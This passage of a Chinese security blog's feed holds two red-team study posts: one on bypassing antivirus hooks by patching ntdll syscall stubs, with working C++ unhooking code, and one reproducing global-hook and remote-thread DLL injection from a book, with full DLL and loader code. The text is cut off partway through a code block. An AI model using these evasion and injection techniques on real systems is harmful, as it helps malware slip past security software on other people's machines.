      <link href="/2024/04/15/unhook_AVBypass/"/>
      <url>/2024/04/15/unhook_AVBypass/</url>
      
        <content type="html"><![CDATA[<h1 id="UnhookingPatch"><a href="#UnhookingPatch" class="headerlink" title="UnhookingPatch"></a>UnhookingPatch</h1><p>项目地址：<a href="https://github.com/SaadAhla/UnhookingPatch">https://github.com/SaadAhla/UnhookingPatch</a></p><p>通过syscall stub来判断是否被hook</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">isItHooked</span><span class="params">(LPVOID addr)</span> </span>&#123;</span><br><span class="line">    BYTE stub[] = <span class="string">&quot;\x4c\x8b\xd1\xb8&quot;</span>;          </span><br><span class="line">    <span class="comment">// syscall stub:</span></span><br><span class="line">    <span class="comment">// mov r10, rcx</span></span><br><span class="line">    <span class="comment">// mov eax</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(addr, stub, <span class="number">4</span>) != <span class="number">0</span>) </span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unhook的手法，修改内存页属性，将patch内容写入内存，恢复内存页</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookPatch</span><span class="params">(LPVOID addr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    DWORD oldprotect = <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line">    BYTE syscallNum = <span class="built_in">GetsyscallNum</span>(addr);</span><br><span class="line">    DWORD64 syscallInst = <span class="built_in">GetsyscallInstr</span>(addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// mov     r10, rcx        </span></span><br><span class="line">    <span class="comment">// mov     eax, SSN</span></span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="comment">// retn</span></span><br><span class="line"></span><br><span class="line">    BYTE patch[] = &#123; <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xCA</span>, <span class="number">0xB8</span>, <span class="number">0xBC</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0xC3</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    patch[<span class="number">4</span>] = syscallNum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// syscall instruction</span></span><br><span class="line">    patch[<span class="number">8</span>] = *(BYTE*)syscallInst;</span><br><span class="line">    patch[<span class="number">9</span>] = *(BYTE*)(syscallInst + <span class="number">0x1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 addr 指向的内存页的保护属性设置为可执行、可读写，并将原始的保护属性值存储到 oldprotect 变量中，以便将来恢复原始的保护属性</span></span><br><span class="line">    BOOL status1 = <span class="built_in">VirtualProtect</span>(addr, <span class="number">4096</span>, PAGE_EXECUTE_READWRITE, &amp;oldprotect);</span><br><span class="line">    <span class="keyword">if</span> (!status1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed in changing protection (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(addr, patch, <span class="built_in">sizeof</span>(patch));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 恢复</span></span><br><span class="line">    BOOL status2 = <span class="built_in">VirtualProtect</span>(addr, <span class="number">4096</span>, oldprotect, &amp;oldprotect);</span><br><span class="line">    <span class="keyword">if</span> (!status2) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed in changing protection back (%u)\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="LdrLoadDll-Unhooking"><a href="#LdrLoadDll-Unhooking" class="headerlink" title="LdrLoadDll-Unhooking"></a>LdrLoadDll-Unhooking</h1><p>项目地址：<a href="https://github.com/trickster0/LdrLoadDll-Unhooking">https://github.com/trickster0/LdrLoadDll-Unhooking</a></p><p>上个项目的思路就是直接修改内存中数据然后patch掉</p><p>这个项目的思路：实际上是做一个跳板函数绕过hook</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404152101165.png" alt="image-20240415210111729"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://killer.wtf/2022/01/19/CustomJmpUnhook.html">https://killer.wtf/2022/01/19/CustomJmpUnhook.html</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Hacker Review - 注入技术</title>
      <link href="/2024/04/10/WindowsHacker-InjectionTrick/"/>
      <url>/2024/04/10/WindowsHacker-InjectionTrick/</url>
      
        <content type="html"><![CDATA[<blockquote><p>寒假的时候写的，4月才发现没有发到博客：(</p></blockquote><h1 id="Windows注入技术-复现"><a href="#Windows注入技术-复现" class="headerlink" title="Windows注入技术 复现"></a>Windows注入技术 复现</h1><p>对于《Windows黑客编程》一书中的各种注入技术进行复现和总结</p><p>环境：</p><ul><li>OS：windows10</li><li>IDE：Visual Studio 2022</li></ul><h2 id="全局钩子注入"><a href="#全局钩子注入" class="headerlink" title="全局钩子注入"></a>全局钩子注入</h2><p>Windows中的大部分应用程序依赖于消息机制，其中含有消息过程函数，而Windows操作系统的钩子机制用于截获和监视系统中的消息。</p><p>依据钩子的作用范围，可以分为局部钩子和全局钩子：</p><ul><li>局部钩子：针对某个线程</li><li>全局钩子：作用于整个系统的消息</li></ul><h3 id="WinAPI介绍"><a href="#WinAPI介绍" class="headerlink" title="WinAPI介绍"></a>WinAPI介绍</h3><p>关于全局钩子注入Win32 API介绍：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HHOOK WINAPI SetWindowsHookEx&#123;</span><br><span class="line">    _In_ <span class="type">int</span> idHook,<span class="comment">// 钩子程序类型</span></span><br><span class="line">    _In_ HOOKPROC lpfn,<span class="comment">// 指向钩子程序的函数指针</span></span><br><span class="line">    _In_ HINSTANCE hMod,<span class="comment">// 已加载的DLL或EXE实例的句柄，HMODULE句柄是通过LoadLibrary或GetModuleHandle等函数加载模块时返回</span></span><br><span class="line">    _In_ DWORD dwThreadId<span class="comment">// 与钩子相关的线程标识符，如果参数为0表示与系统中所有线程相关联</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回值:</span></span><br><span class="line"><span class="comment">// 设置成功则返回钩子过程的句柄</span></span><br><span class="line"><span class="comment">// 设置失败则返回值为NULL</span></span><br></pre></td></tr></table></figure><p>将程序定义的钩子函数（<code>HOOKPROC lpfn</code>）安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联</p><h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><h4 id="生成DLL文件"><a href="#生成DLL文件" class="headerlink" title="生成DLL文件"></a>生成DLL文件</h4><p>新建一个DLL空项目</p><p>预编译头pch.h中设置</p><blockquote><p>该文件是预编译标头文件，仅仅编译一次</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加要在此处预编译的标头</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="comment">// 设置钩子函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">SetHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">// 钩子回调函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function">LRESULT <span class="title">GetMsgProc</span><span class="params">(<span class="type">int</span> code, WPARAM wParam, LPARAM lParam)</span></span>;</span><br><span class="line"><span class="comment">// 卸载钩子函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function">BOOL <span class="title">UnsetHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br></pre></td></tr></table></figure><p>在pch.cpp文件中实现上述函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pch.cpp: 与预编译标头对应的源文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当使用预编译的头时，需要使用此源文件，编译才能成功。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> HMODULE g_hDllModule;<span class="comment">// 已经加载的DLL的句柄</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为DLL创建一个数据段，然后再对程序的链接器进行设置，把指定的数据段链接为共享数据段</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span>data_seg(<span class="string">&quot;mydata&quot;</span>)<span class="comment">// 相当于use mydata的这种感觉</span></span></span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;<span class="comment">// Hook句柄(注意与HMODULE的区别)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()<span class="comment">// 恢复默认的数据段设置</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/SECTION:mydata,RWS&quot;</span>)<span class="comment">// 告诉链接器设置为RWS</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调函数</span></span><br><span class="line"><span class="function">LRESULT <span class="title">GetMsgProc</span><span class="params">(<span class="type">int</span> code, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ::<span class="built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);</span><br><span class="line">    <span class="comment">// 将当前钩子传递给钩子链中的下一个钩子</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">g_hHook = <span class="built_in">SetWindowsHookEx</span>(WH_GETMESSAGE,</span><br><span class="line">(HOOKPROC)GetMsgProc, g_hDllModule, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnsetHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 直接 :: 表示从全局作用域解析</span></span><br><span class="line">::<span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在DLL的入口文件dllmain.cpp中设置</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">HMODULE g_hDllModule = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:<span class="comment">// 由于进程启动或调用LoadLibrary, DLL被加载到当前进程的虚拟地址空间中, 会进入如下路由</span></span><br><span class="line">    &#123;</span><br><span class="line">        g_hDllModule = hModule;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Release，X86下生成：</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401272235151.png" alt="image-20240127220704720"></p><p>可以发现对应文件夹下生成dll文件</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401272235238.png" alt="image-20240127220737886"></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>新建一个CPP空项目</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 全局钩子注入</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 声明函数指针, 返回值为BOOL, 参数值为空</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_SetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_UnsetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;<span class="comment">// DLL句柄</span></span><br><span class="line">typedef_SetGlobalHook SetGlobalHook = <span class="literal">NULL</span>;<span class="comment">// 设置全局钩子的句柄</span></span><br><span class="line">typedef_UnsetGlobalHook UnsetGlobalHook = <span class="literal">NULL</span>;<span class="comment">// 卸载全局钩子的句柄</span></span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// 加载DLL，获得句柄实例</span></span><br><span class="line">hDll = ::<span class="built_in">LoadLibraryW</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;C:\\Users\\icfh\\source\\repos\\DLLInjection\\Release\\DLLInjection.dll&quot;</span>));</span><br><span class="line">        <span class="comment">// 异常检测</span></span><br><span class="line"><span class="keyword">if</span> (hDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从hDll句柄对应文件中加载SetHook地址，并把该地址位置上的数据视为typedef_SetGlobalHook函数（返回函数指针）</span></span><br><span class="line">SetGlobalHook = (typedef_SetGlobalHook)::<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;SetHook&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (SetGlobalHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bRet = <span class="built_in">SetGlobalHook</span>();<span class="comment">// 运行函数 -- 设置全局钩子</span></span><br><span class="line"><span class="keyword">if</span> (bRet) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook OK.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;SetGlobal Hook Error.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 同理获取卸载全局钩子</span></span><br><span class="line">UnsetGlobalHook = (typedef_UnsetGlobalHook)::<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;UnsetHook&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (UnsetGlobalHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::<span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 卸载全局钩子</span></span><br><span class="line"><span class="built_in">UnsetGlobalHook</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook OK. \n&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202401272235344.png" alt="image-20240127223514057"></p><h2 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h2><p>远线程注入是指一个进程在另一个进程中创建线程的技术</p><p>核心函数主要如下：</p><ul><li>LoadLibrary：将指定的DLL文件动态加载到进程空间</li><li>CreateRemoteThread：在目标进程的虚拟地址空间中创建运行的线程</li></ul><p>大致原理：</p><ul><li>获得LoadLibrary函数的地址</li></ul><p>​虽然Windows的ASLR机制会使得LoadLibrary在每次开机时的地址不同，但对于同个时候Windows的kernel32.dll的加载基址在各个进程中都是相同的，因此LoadLibrary也是相同的。</p><ul><li>写入注入的DLL路径字符串</li></ul><p>​通过OpenProcess打开进程获得句柄，然后调用VirtualAllocEx在目标进程中申请一块内存空间，再调用WriteProcessMemory将恶意DLL路径写入到目标进程的空间地址中</p><h3 id="WinAPI介绍-1"><a href="#WinAPI介绍-1" class="headerlink" title="WinAPI介绍"></a>WinAPI介绍</h3><ul><li>OpenProcess</li></ul><p>打开现有的本地进程，获得句柄</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ DWORD dwDesiredAccess,<span class="comment">// </span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInheritHandle,<span class="comment">// True =&gt; 将继承原本进程中已有的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwProcessId<span class="comment">// 要打开的进程PID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><ul><li>VirtualAllocEx</li></ul><p>对指定进程的虚拟地址空间内保留、提交或更改内存的状态</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID WINAPI <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HANDLE  hProcess,<span class="comment">// 进程句柄，句柄必须具有PROCESS_VM_OPERATION的权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,<span class="comment">// 指定要分配页面所需起始地址的指针，如果为NULL则表示自动分配内存</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,<span class="comment">// 分配的内存大小，以字节为单位</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,<span class="comment">// 内存分配类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ DWORD flProtect<span class="comment">// 要分配的页面区域的内存保护类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><ul><li>WriteProcessMemory</li></ul><p>在指定进程的指定可访问的内存区域写入数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HANDLE hProcess,<span class="comment">// 目标进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,<span class="comment">// 要写入数据的内存区域的基地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPCVOID lpBuffer,<span class="comment">// 存储数据的缓冲区的基地址</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,<span class="comment">// 要写入的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ SIZE_T *lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function">    <span class="comment">// 成功则返回值不为NULL</span></span></span><br></pre></td></tr></table></figure><ul><li>CreateRemoteThread</li></ul><p>在指定进程中创建运行的线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_HANDLEhProcess,<span class="comment">// 目标进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_LPSECURITY_ATTRIBUTESlpThreadAttributes,<span class="comment">// 指向SECURITY_ATTRIBUTES结构的指针，指定了新线程的安全描述符，并确定了子进程是否可以继承返回的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_SIZE_TdwStackSize,<span class="comment">// 堆栈的初始大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_LPTHREAD_START_ROUTINElpStartAddress,<span class="comment">// 指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示了远程进程的起始地址，该函数必须存在于远程进程中</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_LPVOIDlpParameter,<span class="comment">// 指向要传递给线程函数的变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_DWRODdwCreationFlags,<span class="comment">// 控制线程创建的标志，若为0则表示线程在创建后立即执行</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_LPDWORDlpThread<span class="comment">// 指向了接收线程标识的变量的指针，如果此参数为NULL，则不返回线程标识符</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><h3 id="操作过程-1"><a href="#操作过程-1" class="headerlink" title="操作过程"></a>操作过程</h3><h4 id="生成DLL文件-1"><a href="#生成DLL文件-1" class="headerlink" title="生成DLL文件"></a>生成DLL文件</h4><p>dllmain.cpp文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 